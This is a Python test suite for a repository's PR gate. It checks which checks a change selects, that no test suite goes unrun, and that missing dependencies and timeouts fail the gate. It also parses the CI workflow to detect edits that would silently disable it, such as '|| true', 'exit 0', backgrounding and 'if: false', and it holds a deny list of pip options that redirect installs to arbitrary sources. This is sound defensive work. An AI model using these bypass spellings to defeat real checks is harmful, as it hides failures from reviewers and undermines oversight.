#!/usr/bin/env python3
"""Offline tests for scripts/ai/pr_gate.py — the PR gate's check selector and reporter.

The gate exists because a skipped check reads like a passing one, so these tests care most
about the ways it could go quiet: a suite no check runs, a missing dependency reported as a
skip, an advisory check silently promoted or demoted, a trigger list that selects nothing.

Run offline: python tests/test_pr_gate.py
"""

import ast
import importlib.util
import io
import os
import pathlib
import re
import subprocess
import sys
import tempfile
from contextlib import contextmanager, redirect_stdout

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(REPO, "scripts", "ai"))

import pr_gate  # noqa: E402

PASSED = 0
FAILED = []
# The shell vocabulary, module-scoped because it had five copies with three different contents, and
# the copies disagreed: `[[ … ]]` and `while true` were accepted by some rules and refused by others,
# so two correct respellings failed. Anything comparing shell words uses these (the function-scoped
# TEST_CMDS / NO_OPS / OPENERS alias them for the rules defined further down).
SHELL_TEST_CMDS = ("[", "[[", "test")
# Read by the tail whitelist, which is defined above their old homes. Module scope for
# the same reason as the vocabulary above: one definition, not one per reader.
PIP_VALUE_OPTS = ("--upgrade-strategy", "--timeout", "--retries", "--progress-bar",
                  "--cache-dir", "--log")
# Refused by *name*, whichever spelling: these turn a pinned install into an arbitrary one, and
# `--index-url=URL` is a single word beginning with `-`, so a rule that only asked "does every
# trailing token look like an option" admitted every one of them. `--only-binary`/`--no-binary`
# and `--python-version` moved here from the value list too: their value selects what gets
# installed, and nothing in this workflow needs them.
PIP_PAYLOAD_OPTS = ("-r", "--requirement", "-e", "--editable", "-c", "--constraint",
                    "-i", "--index-url", "--extra-index-url", "--find-links", "-f",
                    "--target", "-t", "--prefix", "--root", "--config-settings", "-C",
                    "--only-binary", "--no-binary", "--python-version", "--platform",
                    "--implementation", "--abi", "--pre", "--no-deps")
TERMINATOR = ("exit", "return")
KEYWORDS = ("then", "else", "elif", "do", "done", "fi", "esac", "!", "{", "}", "(", ")")
SHELL_NO_OPS = (":", "true", "false")
SHELL_OPENERS = ("if", "elif", "while", "until", "for", "case")
# EXPECTED is a bare literal on purpose. Deriving it from the workflow's shape self-cancelled: a
# silenced loop decremented the expectation by exactly what it stopped checking, so the invariant
# read PASSED == EXPECTED with checks missing. A literal has to be raised by hand, which is the point.


@contextmanager
def outside_any_repo(path):
    """Make `path` genuinely repo-less however TMPDIR is pointed.

    Two checks below assert that an unusable repo is a *tool error*, and both expressed "unusable" as
    "a fresh temp directory" — which is only true while TMPDIR sits outside a git repository. Point it
    inside one (a reviewer did, working around a sandbox restriction on /tmp) and git discovers the
    enclosing repo instead, so both checks fail while the property they test still holds. A test whose
    subject is "no repo here" has to construct that, not inherit it from the environment.
    """
    # GIT_CEILING_DIRECTORIES was the first attempt and does not do this: pointed at the starting
    # directory it still discovered the enclosing repo. GIT_DIR naming a path that does not exist
    # fails discovery outright, which is the property both checks are actually about.
    prior = os.environ.get("GIT_DIR")
    os.environ["GIT_DIR"] = os.path.join(os.path.realpath(path), "absent-on-purpose")
    try:
        yield
    finally:
        if prior is None:
            os.environ.pop("GIT_DIR", None)
        else:
            os.environ["GIT_DIR"] = prior


def check_named(name):
    """The CHECKS entry called `name`, or None — never a StopIteration.

    Spelled as a bare `next()` in five places, renaming a check aborted the whole suite with
    `StopIteration:` and no message: no [FAIL], no diagnostic, no count. A missing check is a
    finding to report, not an exception to raise.
    """
    return next((c for c in pr_gate.CHECKS if c["name"] == name), None)


def check(label, condition, detail=""):
    global PASSED
    if condition:
        PASSED += 1
        print(f"  [PASS] {label}")
    else:
        FAILED.append(label)
        print(f"  [FAIL] {label}" + (f"\n         {detail}" if detail else ""))


def run_gate(*args):
    proc = subprocess.run([sys.executable, os.path.join(REPO, "scripts", "ai", "pr_gate.py"),
                           *args], cwd=REPO, capture_output=True, text=True)
    return proc.returncode, proc.stdout + proc.stderr


def selected_names(files):
    return {c["name"] for c in pr_gate.CHECKS if pr_gate.selects(c, files)}


def main_with(args):
    """Drive main() in-process so the verdict itself is asserted, not just its helpers.

    Testing `missing_deps()` and `unlisted_suites()` in isolation left both able to report a
    problem while the gate still exited 0 — the absence hole this gate exists to prevent, in
    the gate's own tests. These go through the exit code.
    """
    # pr_gate_suite triggers on tests/, so a fixture naming a tests/ path would select this
    # very suite and main() would run it as a subprocess of itself. Refused here, once, rather
    # than trusted to every future call site: an unbounded recursion in a test that runs the
    # real gate is a hang, not a failure.
    if "--changed-files-from" in args:
        listed = args[args.index("--changed-files-from") + 1]
        with open(listed) as fh:
            fixture_paths = [ln.strip() for ln in fh if ln.strip()]
        nesting = [c["name"] for c in pr_gate.CHECKS
                   if pr_gate.selects(c, fixture_paths) and c["cmd"]
                   and "tests/test_pr_gate.py" in c["cmd"]]
        assert not nesting, f"fixture {fixture_paths} would nest the gate inside {nesting}"
    saved = sys.argv
    buf = io.StringIO()
    try:
        sys.argv = ["pr_gate.py", *args]
        with redirect_stdout(buf):
            try:
                code = pr_gate.main()
            except SystemExit as exc:
                # `die()` exits rather than returning, so a tool error arrives as SystemExit.
                # Letting it escape would abort this suite mid-run and look like a crash
                # instead of the exit code under test.
                code = exc.code if isinstance(exc.code, int) else 2
    finally:
        sys.argv = saved
    return code, buf.getvalue()


def changed_list(*paths):
    fh = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    fh.write("".join(p + "\n" for p in paths))
    fh.close()
    return fh.name


print("\nSelection maps a change to the checks that cover it")
sel = selected_names(["datasets/sfdmu/qb-pricing/export.json"])
check("a data plan change selects the plan README gate",
      "plan_readme_consistency" in sel, sel)
check("a data plan change selects the SFDMU validator", "sfdmu_datasets" in sel, sel)
sel = selected_names(["docs/guides/some-guide.md"])
check("a docs change selects the build-step citation check",
      "doc_build_steps" in sel, sel)
check("a docs change does not select the data plan gate",
      "plan_readme_consistency" not in sel, sel)
sel = selected_names(["cumulusci.yml"])
check("a cumulusci.yml change selects the CCI reference drift check",
      "cci_reference_drift" in sel, sel)
sel = selected_names(["docs/erds/erd-data.json"])
check("an ERD data change selects the ERD count check", "erd_doc_counts" in sel, sel)
# Selection must still be able to come up empty, or "selected" means nothing. The probe has
# to be outside the manifest audit's roots, which are deliberately repo-wide: a manifest can
# cite a path anywhere, so robot/ (a root) no longer qualifies as an unclaimed path.
sel = selected_names(["docker/Dockerfile"])
check("a path no check claims selects nothing rather than everything", sel == set(), sel)
# A suffix selector, for the check that walks every .md in the repo. Prefix triggers left
# the root README and seven datasets/**/README.md build-step citations unable to select the
# suite that audits them.
check("the root README selects the build-step check",
      "doc_build_steps" in selected_names(["README.md"]),
      selected_names(["README.md"]))
check("a data plan README selects the build-step check",
      "doc_build_steps" in selected_names(
          ["datasets/sfdmu/qb/en-US/qb-billing/README.md"]))
check("a non-markdown file does not select it via the suffix",
      "doc_build_steps" not in selected_names(["robot/x.robot"]))
check("only the whole-repo check carries a suffix selector",
      [c["name"] for c in pr_gate.CHECKS if c.get("suffixes")] == ["doc_build_steps"],
      [c["name"] for c in pr_gate.CHECKS if c.get("suffixes")])
check("a harness change selects the harness suites",
      "harness_suites" in selected_names(["scripts/txn_data_harness/cli.py"]))
check("an empty change set selects nothing", selected_names([]) == set())
# Triggers are path prefixes, not substrings: a vendored or nested lookalike must not
# select a check that has no authority over it.
check("a trigger embedded mid-path does not select",
      "plan_readme_consistency" not in selected_names(
          ["vendor/datasets/sfdmu/export.json"]),
      selected_names(["vendor/datasets/sfdmu/export.json"]))
check("a trigger at the start does select",
      "plan_readme_consistency" in selected_names(["datasets/sfdmu/export.json"]))

print("\nEvery check is well formed")
names = [c["name"] for c in pr_gate.CHECKS]
check("check names are unique", len(names) == len(set(names)), names)
check("every check has at least one trigger",
      all(c["triggers"] for c in pr_gate.CHECKS))
check("every declared dep is one the gate knows how to detect",
      all(d in pr_gate.DEPS for c in pr_gate.CHECKS for d in c["deps"]))
check("every non-gating check explains itself",
      all(c.get("note") for c in pr_gate.CHECKS if not c["gating"]))
tooling_spec = check_named("agent_tooling")
check("agent_tooling declares the 3.10+ floor it actually needs",
      tooling_spec is not None and tooling_spec.get("min_python") == (3, 10))

print("\nNo suite goes unrun, and none is claimed but absent")
check("no suite in tests/ is left unclaimed", pr_gate.unlisted_suites() == [],
      pr_gate.unlisted_suites())
missing = [s for s in pr_gate.STDLIB_SUITES if not os.path.exists(os.path.join(REPO, s))]
check("every stdlib suite the gate names exists on disk", missing == [], missing)
missing = [s for s in pr_gate.CLAIMED_SUITES if not os.path.exists(os.path.join(REPO, s))]
check("every claimed suite or directory exists on disk", missing == [], missing)
missing = [s for s in pr_gate.EXCLUDED_SUITES if not os.path.exists(os.path.join(REPO, s))]
check("every excluded suite exists on disk", missing == [], missing)
check("every exclusion states a reason",
      all(r.strip() for r in pr_gate.EXCLUDED_SUITES.values()))
check("no suite is both claimed and excluded",
      not (set(pr_gate.EXCLUDED_SUITES) & pr_gate.CLAIMED_SUITES))
check("a suite is never run twice — no dedicated check's suite is also in a bulk list",
      "tests/test_branch_scope.py" not in pr_gate.STDLIB_SUITES
      and "tests/test_erd_doc_counts.py" not in pr_gate.STDLIB_SUITES)
# Discovery must recurse. A flat listing missed 30 suites in tests/build_harness/ and
# tests/txn_data_harness/ while reporting "none unclaimed".
nested = [s for s in pr_gate.CLAIMED_SUITES if s.endswith("/")]
check("nested suite directories are claimed as directories", len(nested) >= 2, nested)
real_nested = [
    f for d in nested
    for f in os.listdir(os.path.join(REPO, d))
    if f.startswith("test_") and f.endswith(".py")
]
check("those directories really do hold suites", len(real_nested) > 20, len(real_nested))

# A new suite must fail loudly rather than join silently — verified in a temp tree, so a
# crash cannot leave a stray file in the real tests/ that then fails everyone else's gate.
with tempfile.TemporaryDirectory() as fake_repo:
    os.makedirs(os.path.join(fake_repo, "tests", "nested"))
    open(os.path.join(fake_repo, "tests", "nested", "test_probe.py"), "w").close()
    saved_root = pr_gate.REPO_ROOT
    try:
        pr_gate.REPO_ROOT = fake_repo
        found = pr_gate.unlisted_suites()
        check("an unclaimed suite in a nested directory is detected",
              found == ["tests/nested/test_probe.py"], found)
        code, out = main_with(["--changed-files-from", os.devnull])
        check("an unclaimed suite fails the gate", code == 1, code)
        check("the unclaimed suite is named in the output", "suites no check runs" in out)
        # A shell suite must be discovered too, so excluding one is a declaration.
        open(os.path.join(fake_repo, "tests", "test-probe.sh"), "w").close()
        check("a shell suite is discovered rather than missed by the .py filter",
              "tests/test-probe.sh" in pr_gate.unlisted_suites(),
              pr_gate.unlisted_suites())
        # A directory claim covers pytest-collectable .py only. A shell suite dropped into a
        # claimed directory has no runner, so being "claimed" there would be a silent skip.
        claimed_dir = sorted(c for c in pr_gate.CLAIMED_SUITES if c.endswith("/"))[0]
        os.makedirs(os.path.join(fake_repo, claimed_dir), exist_ok=True)
        open(os.path.join(fake_repo, claimed_dir, "test_inside.py"), "w").close()
        open(os.path.join(fake_repo, claimed_dir, "test-inside.sh"), "w").close()
        listed = pr_gate.unlisted_suites()
        check("a .py suite under a claimed directory is covered by the claim",
              claimed_dir + "test_inside.py" not in listed, listed)
        check("a shell suite under a claimed directory is not covered by the claim",
              claimed_dir + "test-inside.sh" in listed, listed)
    finally:
        pr_gate.REPO_ROOT = saved_root

with tempfile.TemporaryDirectory() as empty:
    saved_root = pr_gate.REPO_ROOT
    try:
        pr_gate.REPO_ROOT = empty
        check("a missing tests/ directory is reported, not read as 'none unclaimed'",
              pr_gate.unlisted_suites() != [], pr_gate.unlisted_suites())
    finally:
        pr_gate.REPO_ROOT = saved_root

print("\nA missing dependency fails a gating check instead of skipping it")
fake_gating = dict(name="probe", cmd=["python", "-c", "pass"], triggers=["x"],
                   deps=["cumulusci"], gating=True)
saved = dict(pr_gate.DEPS)
try:
    pr_gate.DEPS["cumulusci"] = "a_module_that_does_not_exist_anywhere"
    check("a gating check with an absent dep reports it as missing",
          pr_gate.missing_deps(fake_gating) == ["cumulusci"],
          pr_gate.missing_deps(fake_gating))
finally:
    pr_gate.DEPS.clear()
    pr_gate.DEPS.update(saved)
check("a satisfied dep reports nothing missing",
      pr_gate.missing_deps(dict(fake_gating, deps=[])) == [])
check("a future python floor is reported as a missing dep",
      pr_gate.missing_deps(dict(fake_gating, deps=[], min_python=(99, 0))) != [])

# ...and the verdict, not just the report: an absent dependency has to fail the gate.
saved = dict(pr_gate.DEPS)
listing = changed_list("docs/guides/some-guide.md")
try:
    pr_gate.DEPS["cumulusci"] = "a_module_that_does_not_exist_anywhere"
    code, out = main_with(["--changed-files-from", listing])
    check("an absent dependency fails the gate rather than skipping it", code == 1, code)
    check("the absent dependency is named as MISSING-DEP", "MISSING-DEP" in out)
finally:
    pr_gate.DEPS.clear()
    pr_gate.DEPS.update(saved)
    os.unlink(listing)

print("\nA check that actually fails fails the gate")
# The gate's whole purpose. Without this, reclassifying every runtime failure as advisory
# would leave the suite green — the one mutation that survived the first round.
listing = changed_list("zz_probe_path/thing.txt")
pr_gate.CHECKS.append(dict(name="zz_probe_failing",
                           cmd=["python", "-c", "import sys; sys.exit(1)"],
                           triggers=["zz_probe_path/"], deps=[], gating=True))
try:
    code, out = main_with(["--changed-files-from", listing])
    check("a failing gating check exits 1", code == 1, code)
    check("a failing gating check is labelled FAIL", "[FAIL" in out)
    check("the failing check is named in the summary", "zz_probe_failing" in out)
    check("its output is echoed for diagnosis", "zz_probe_failing (FAIL)" in out)
    check("a failure with no output says so rather than showing an empty section",
          "the check produced no output" in out)
    pr_gate.CHECKS[-1]["gating"] = False
    pr_gate.CHECKS[-1]["note"] = "probe"
    code, out = main_with(["--changed-files-from", listing])
    check("the same failure as advisory does not fail the gate", code == 0, code)
    check("but is still reported as an advisory failure", "advisory failure" in out)
    # Advisory output is truncated to its head; a gating failure's is not, so it stays
    # diagnosable from the log alone.
    noisy = ["python", "-c",
             f"print('\\n'.join(str(i) for i in range({pr_gate.ADVISORY_HEAD + 30})))"
             "; import sys; sys.exit(1)"]
    pr_gate.CHECKS[-1]["cmd"] = noisy
    code, out = main_with(["--changed-files-from", listing])
    check("a long advisory report is truncated rather than dumped whole",
          "line(s) elided" in out, out[-300:])
    # The head, not the tail: the SFDMU validator's Critical counts are at the top, and
    # tailing kept twenty lines of passing plans and elided the only useful part.
    check("truncation keeps the beginning of an advisory report", "\n0\n" in out)
    check("...and drops the end",
          f"\n{pr_gate.ADVISORY_HEAD + 29}\n" not in out)
    pr_gate.CHECKS[-1]["gating"] = True
    code, out = main_with(["--changed-files-from", listing])
    check("a gating failure is never truncated", "line(s) elided" not in out)
    check("...and shows its earliest output too", "\n0\n" in out)
finally:
    pr_gate.CHECKS.pop()
    os.unlink(listing)

print("\nA hung check is bounded and reported, not left to burn the job's budget")
listing = changed_list("zz_probe_path/thing.txt")
saved_timeout = pr_gate.CHECK_TIMEOUT
pr_gate.CHECKS.append(dict(name="zz_probe_hang",
                           cmd=["python", "-c", "import time; time.sleep(30)"],
                           triggers=["zz_probe_path/"], deps=[], gating=True))
try:
    pr_gate.CHECK_TIMEOUT = 1
    code, out = main_with(["--changed-files-from", listing])
    check("a check exceeding the timeout fails the gate", code == 1, code)
    check("the timeout is named in the output", "timed out after 1s" in out, out[-300:])
finally:
    pr_gate.CHECK_TIMEOUT = saved_timeout
    pr_gate.CHECKS.pop()
    os.unlink(listing)

print("\nThe advisory carve-out stays exactly one check, with its reason")
advisory = [c for c in pr_gate.CHECKS if not c["gating"]]
check("exactly one check is advisory", len(advisory) == 1, [c["name"] for c in advisory])
check("the advisory one is the SFDMU validator",
      advisory and advisory[0]["name"] == "sfdmu_datasets")
check("its note cites the pack that keeps it advisory",
      advisory and "123" in advisory[0]["note"], advisory[0]["note"] if advisory else "")

print("\nA failure in one command does not hide the commands after it")
code, out, _ = pr_gate.run_sequence([["python", "-c", "print('first')"],
                                     ["python", "-c", "import sys; sys.exit(3)"],
                                     ["python", "-c", "print('third')"]])
check("a sequence reports non-zero when any command fails", code != 0, code)
check("commands before the failure still ran", "first" in out)
check("commands after the failure still ran", "third" in out)

print("\nDependency pins agree with the workflow that installs them")
prepare = os.path.join(REPO, ".github", "workflows", "prepare-rlm-org.yml")
if os.path.exists(prepare):
    with open(prepare) as fh:
        body = fh.read()
    pinned = re.findall(r"cumulusci==([\d.]+)", body)
    gate_pin = re.findall(r"cumulusci==([\d.]+)", pr_gate.PINS.get("cumulusci", ""))
    check("the gate pins the same CumulusCI version prepare-rlm-org installs",
          bool(pinned) and bool(gate_pin) and pinned[0] == gate_pin[0],
          f"prepare-rlm-org={pinned}, pr_gate={gate_pin}")
else:
    check("prepare-rlm-org.yml exists to compare pins against", False, "file missing")

print("\nThe workflow that runs the gate cannot be quietly defanged")
# The gate is only as real as the job that invokes it, and every way of disabling that job
# leaves a green PR behind — which is the exact failure #264-58 exists to fix, one level up.
# So the workflow is asserted here rather than trusted to review. Both ways of not running are
# defects, in opposite directions: a `paths:` filter added in good faith leaves a required check
# Pending and blocks every PR that misses the paths, while an `if:` skip reports success.
workflow = os.path.join(REPO, ".github", "workflows", "pr-checks.yml")
if os.path.exists(workflow):
    with open(workflow) as fh:
        wf = fh.read()

    # Trailing comments, not just whole-line ones. The first version dropped only lines that
    # *start* with `#`, which left every substring rule below satisfiable by a comment on the same
    # line as the setting it contradicts: `fetch-depth: 1 # was fetch-depth: 0` passed the
    # full-history rule, and `pip install requests # reqs, pinned elsewhere` passed the
    # restated-dependency rule, because the excluded word was supplied by the prose. Quote-aware,
    # so a `#` inside a string (`echo "a # b"`) is text and not a comment.
    def uncomment(line):
        out, quote = [], None
        for i, ch in enumerate(line):
            if quote:
                out.append(ch)
                if ch == quote:
                    quote = None
            elif ch in "\"'":
                quote = ch
                out.append(ch)
            elif ch == "#" and (i == 0 or line[i - 1] in " \t"):
                break
            else:
                out.append(ch)
        return "".join(out).rstrip()

    def strip_comments(text):
        return "\n".join(uncomment(ln) for ln in text.splitlines())

    # Enough block YAML to read this workflow's *structure*, which regexes over its text cannot.
    # A review defeated fourteen text-scoped rules at once, and every defeat exploited the gap
    # between a rule's spelling and the property it meant: `"continue-on-error": true` slipped a
    # regex over unquoted keys; `shell: "cat {0}"` made the step print the script instead of running
    # it, and the rule enumerated only two keys; `if: false` appended after the `steps:` list landed
    # outside the positional window that stood in for "the job"; a decoy job before the real one
    # truncated that window entirely. None of those is an exotic shape — they are all just *keys*,
    # which is what a parser sees and a substring cannot.
    #
    # Stdlib, because this suite declares no dependencies: the check that judges the workflow must
    # not be the one that reports MISSING-DEP and skips. It refuses anything it cannot model rather
    # than guessing, since a step whose keys the reader cannot see would satisfy every whitelist
    # below by having no visible keys at all.
    class YamlUnsupported(Exception):
        pass

    def _dequote(text):
        return text[1:-1] if len(text) > 1 and text[0] == text[-1] and text[0] in "\"'" else text

    def _parse_block(lines, i, min_indent):
        """(value, next_index) for the block starting at or after `lines[i]`.

        The block's own column is taken from its first line rather than assumed, because YAML only
        requires a child to be deeper than its parent, not deeper by a fixed amount."""
        # A sequence and a mapping cannot both start a block, so the first non-blank line decides.
        while i < len(lines) and not lines[i].strip():
            i += 1
        if i >= len(lines) or _col(lines[i]) < min_indent:
            return None, i
        indent = _col(lines[i])
        if lines[i].strip().startswith("- "):
            items = []
            while i < len(lines):
                if not lines[i].strip():
                    i += 1
                    continue
                col = _col(lines[i])
                if col < indent or not lines[i].strip().startswith("- "):
                    break
                rest = lines[i].strip()[2:]
                if rest[:1] in ("{", "["):
                    raise YamlUnsupported("flow collection in a sequence: %r" % lines[i])
                inner = col + 2
                if re.match(r"""^['"]?[\w.-]+['"]?\s*:""", rest):
                    # `- key: value` — the item is a mapping whose first key shares this line.
                    synthetic = [" " * inner + rest] + lines[i + 1:]
                    value, consumed = _parse_block(synthetic, 0, inner)
                    i = i + 1 + (consumed - 1)
                    items.append(value)
                else:
                    items.append(_dequote(rest))
                    i += 1
            return items, i
        mapping = {}
        while i < len(lines):
            if not lines[i].strip():
                i += 1
                continue
            col = _col(lines[i])
            if col < indent:
                break
            if col > indent:
                raise YamlUnsupported("unexpected indent: %r" % lines[i])
            m = re.match(r"""^['"]?([\w.$-]+)['"]?\s*:\s*(.*)$""", lines[i].strip())
            if not m:
                raise YamlUnsupported("not a mapping entry: %r" % lines[i])
            key, rest = _dequote(m.group(1)), m.group(2)
            if key in mapping:
                raise YamlUnsupported("duplicate key %r would hide the first" % key)
            if rest[:1] in ("&", "*") or rest.startswith("<<"):
                raise YamlUnsupported("anchor, alias or merge key: %r" % lines[i])
            if re.match(r"^[|>][-+]?$", rest):
                # Block scalar: every deeper line, kept raw, because it is shell and not YAML.
                body, i = [], i + 1
                while i < len(lines) and (not lines[i].strip() or _col(lines[i]) > col):
                    body.append(lines[i])
                    i += 1
                mapping[key] = "\n".join(body)
            elif rest:
                if rest[:1] == "{":
                    # A flow *sequence* value stays legal — `types: [opened, …]` is the workflow's
                    # own spelling and `flow_list` reads it. A flow *mapping* is what this reader
                    # would keep as a string, so `with: {fetch-depth: 1}` — a real defang — reached
                    # the rules as text and crashed them on `.get` instead of failing.
                    raise YamlUnsupported(
                        "flow mapping as a value, which this reader would store as a string and "
                        "every rule that indexes it would then crash on: %r" % lines[i])
                # Values are dequoted, keys already were. Without this a quoted scalar was a
                # *different string* to every pin that compares against it, so writing the job name
                # as `'Mechanical checks'` — YAML-identical — failed the rule that pins the
                # check-run name, under a message about renaming it.
                mapping[key] = None if rest in ("null", "~") else _dequote(rest)
                i += 1
            else:
                mapping[key], i = _parse_block(lines, i + 1, col + 1)
        return mapping, i

    def _col(line):
        return len(line) - len(line.lstrip())

    def parse_yaml(text):
        if "\t" in text:
            raise YamlUnsupported("tab in indentation")
        lines = [uncomment(ln) for ln in text.splitlines()
                 if ln.strip() != "---" and not ln.startswith("%")]
        value, _ = _parse_block(lines, 0, 0)
        return value or {}

    def run_contents(text):
        """Every shell line the workflow executes, whatever scalar style declared it.

        The first version matched `run: |` only. That is not a stylistic omission: a
        single-line `run: echo …` — the way anyone adds a quick step — was never collected, so
        the injection rule below did not miss such a line, it never looked at one. Folded
        (`>`, `>-`) blocks were invisible the same way. Comments are dropped because a rule
        about what the job *executes* must not be satisfiable by prose.
        """
        out, lines = [], strip_comments(text).splitlines()
        for i, line in enumerate(lines):
            opener = re.match(r"^(\s*)run:\s*(?:([|>][-+]?)\s*)?(.*)$", line)
            if not opener:
                continue
            indent, block, inline = len(opener.group(1)), opener.group(2), opener.group(3)
            if not block:
                out.append(inline)          # `run: cmd` on one line
                continue
            for nxt in lines[i + 1:]:
                if nxt.strip() and len(nxt) - len(nxt.lstrip()) <= indent:
                    break
                out.append(nxt)
        return out

    # An invocation that is not `--requirements`, because that one resolves dependencies and its exit
    # code is not a verdict. The question is narrower than "does the name appear in an executed
    # line", since `echo python …` prints the command and `… || true` throws the verdict away: it is
    # "is this the command, and does its exit status still reach the job".
    # Masking is matched against the text *following* the command, not the whole line: a line may
    # legitimately mask an unrelated command before running the real one
    # (`rm -f gate.log || true; python …pr_gate.py`), and rejecting that would make the rule fire
    # on correct code — which is how a rule gets deleted.
    # A bare `&` is masking too, and the sneakiest kind: `cmd &` exits 0 immediately because `$?`
    # is the fork's status, not the command's, so a backgrounded checker reports success while
    # still being a real invocation of the real script. `&&` is a separate token in the split
    # below, so the negative lookahead keeps ordinary chains acceptable.
    MASKED = re.compile(r"^(?:(?:\|\||;)\s*(?:true|:|/bin/true|command\s+true|builtin\s+true"
                        r"|echo|exit\s+0)(?=\s|;|$)|&(?!&))")

    def tokens(ln):
        """Segments and separators, alternating, honouring quotes.

        `re.split` on the operators was close enough while the rules only asked about the segment
        that *contained* a script name. It stops being close enough once every segment must name a
        permitted command, because a `;` inside `echo "a; b"` is text: splitting on it invents a
        segment whose first word is `b"`, which no whitelist would recognise and no shell ever runs.

        Backslash escapes are *not* modelled, and the first version of this docstring called that
        conservative "since the effect is to see more segments rather than fewer". That was wrong in
        the one direction that matters: `echo disabled\\; python …pr_gate.py ${SEL}` is a single echo
        to bash, and the invented second segment is an invocation the shell never runs — seeing more
        segments manufactures a command rather than missing one. So instead of modelling escapes, the
        workflow is asserted to contain none, the same way `parse_yaml` refuses what it cannot read.
        """
        out, cur, i, quote = [], "", 0, ""
        while i < len(ln):
            char = ln[i]
            if quote:
                cur += char
                quote = "" if char == quote else quote
                i += 1
            elif char in "'\"":
                cur, quote, i = cur + char, char, i + 1
            elif ln[i:i + 2] in ("&&", "||"):
                out, cur, i = out + [cur, ln[i:i + 2]], "", i + 2
            elif char == "&" and cur.rstrip().endswith(">"):
                # `2>&1` is one redirection; splitting on this `&` invented a segment `1`, so a
                # correct respelling of a permitted redirection failed the argv pins.
                cur, i = cur + char, i + 1
            elif char in ";|&":
                out, cur, i = out + [cur, char], "", i + 1
            else:
                cur, i = cur + char, i + 1
        return out + [cur]

    def parts(ln):
        """Each shell segment of a line, paired with the text that follows it."""
        pieces = tokens(ln)
        return [(pieces[i], "".join(pieces[i + 1:])) for i in range(0, len(pieces), 2)]

    def reraises(words, after_failure=True):
        """Does this `exit` hand on a failure rather than replace it with success?

        The whole point of exempting a conditional terminator is the handler
        `python … || { echo "::error::…"; exit 1; }`. Exempting on the operator alone also
        admitted `|| { echo "::error::x"; exit 0; }` — reached only when the gate has already
        failed, and then reporting success. A probe aimed at this loosening found it before it
        shipped, which is the reason to aim probes at loosenings.
        """
        arg = words[1] if len(words) > 1 else ""
        if not arg:
            # A bare `exit` was exempted here on the belief that it inherits the failure just
            # caught. It inherits `$?` of the *last command run*, which in the documented handler
            # is the `echo` — so `|| { echo "::error::x"; exit; }` prints the annotation and
            # reports success. Verified in bash. `exit 1`, `exit $?` and `exit "$code"` are the
            # only spellings that actually hand the failure on.
            return False
        bare = arg.strip("\"'").lstrip("$").strip("{}")
        if bare in ("code", "?"):
            return after_failure
        # `.isdigit()` alone read `exit -1` — a non-zero status — as masking. Any numeric
        # literal is fine as long as it is not zero; anything unparseable (`exit $((x))`) is
        # refused, which is the safe direction. Quotes are stripped first, since `exit "1"`
        # re-raises exactly as `exit 1` does and rejecting it fires on correct code.
        try:
            # `% 256` because bash truncates an exit status to 8 bits: `exit 256` and `exit 512`
            # both exit 0, so read as `int(bare) != 0` they were masking handlers this function
            # called re-raises. Verified in bash.
            return int(bare) % 256 != 0
        except ValueError:
            return False

    def tail_preserves_status(tail):
        """Can the text after a verdict-bearing invocation still let a failure reach the job?

        `MASKED` was a *blacklist* of handler commands — `true`, `:`, `echo`, `exit 0`, `&` — and it
        was the last blacklist in a file of whitelists. `|| sleep 0` is not on it, and `sleep` is in
        `HARMLESS`, so both whitelists waved the segment through as a command the step is meant to
        run while the blacklist saw nothing to refuse: the gate ran, produced a real non-zero verdict,
        and the step exited 0. Verified in bash. Two whitelists and one blacklist disagreeing about
        the same word is where the hole was, so this is stated as the property instead:

        - `&& …` runs only on success, so on failure the line's status is the invocation's — safe.
        - `|| …` and `; …` both make the *tail's* status the line's, so the tail has to end the shell
          non-zero. That is exactly `reraises()`, which already knows every spelling that does
          (`exit 1`, `exit $?`, `exit "$code"`) and every spelling that does not (bare `exit`,
          `exit 0`, `exit 256`). The documented correct edit
          `|| { echo "::error::…"; exit 1; }` passes; `|| sleep 0`, `|| printf ''` and every other
          non-terminating handler do not.
        - a bare `&` backgrounds the invocation, so `$?` is the fork's status — masking, and the
          sneakiest kind, since the real script really does run.
        """
        tail = tail.strip()
        if not tail:
            return True
        if re.match(r"&(?!&)", tail):
            return False
        op = tail[:2] if tail[:2] in ("||", "&&") else tail[:1]
        if op == "&&":
            return True
        if op not in ("||", ";"):
            return True
        pieces = tokens(tail[len(op):])
        for i in range(0, len(pieces), 2):
            words = pieces[i].split()
            while words and words[0] in KEYWORDS:
                words = words[1:]
            if words[:1] and words[0] in TERMINATOR:
                return reraises(words, after_failure=(op == "||"))
        return False

    def runs_segment(seg, tail, script, args_required=()):
        """Is this one segment an invocation of `script` whose status is not thrown away?"""
        words = seg.split()
        # The first word of the segment is what runs, so `echo`/`printf`/`:`/`true` there means
        # the script is an argument rather than a command. Arguments are required *within the
        # segment*: checking them line-wide let `--pr` sit in an echo beside a real `set --`.
        # `if`/`while`/`until`/`!` consume the command's status instead of letting it reach the
        # job, so a wrapped invocation runs the real script and still cannot fail the step. The
        # literal last-command rule used to reject those by accident; once that rule became a
        # property ("one command executes the gate"), the keywords had to be named here.
        return bool(words and script in seg
                    and words[0] not in ("echo", "printf", ":", "true",
                                         "if", "elif", "while", "until", "!")
                    and all(a in seg for a in args_required)
                    and tail_preserves_status(tail))

    def executes(ln, script, args_required=()):
        return any(runs_segment(seg, tail, script, args_required) for seg, tail in parts(ln))

    def invocations(script, args_required=()):
        return [ln for ln in run_contents(wf) if executes(ln, script, args_required)]

    # `exit`/`return` do not mask a status, they end the shell: every command after one, on that
    # line or any later line of the step, is unreachable.
    # Keys that cannot express the threat the key rules are about, so both of them admit these.
    # `timeout-minutes` is monotonic in the safe direction — it can turn a pass into a failure, never
    # a failure into a pass. `shell` is admitted as a key and pinned to `bash` by value elsewhere,
    # since `bash` is the runner default on Linux and reinterprets nothing.
    ALSO_FINE = {"timeout-minutes", "shell", "id"}

    def opens(seg):
        return seg.split()[:1]

    def foreground(ln, script, args_required=()):
        """Whether the command *runs*, which is a different question from whether its status
        escapes. `true || python …check_branch_scope.py "$@"` satisfies `executes()` — the segment is
        a genuine invocation and the `code=$?` line still captures a status — but bash skips the
        command and the status captured is 0, so a FOREIGN or STACKED branch goes green. What makes a
        segment skippable is a *conditional* predecessor (`&&`/`||`); `;` does not, which is why the
        cleanup idiom `rm -f gate.log || true; python …` remains acceptable.

        A predecessor that *ends the shell* is the other way a permitted, unmasked command never
        runs, and the separator is irrelevant to it: `exit 0; python …pr_gate.py ${SEL}` is one
        segment that leaves nothing to run, so scanning stops there rather than continuing.
        """
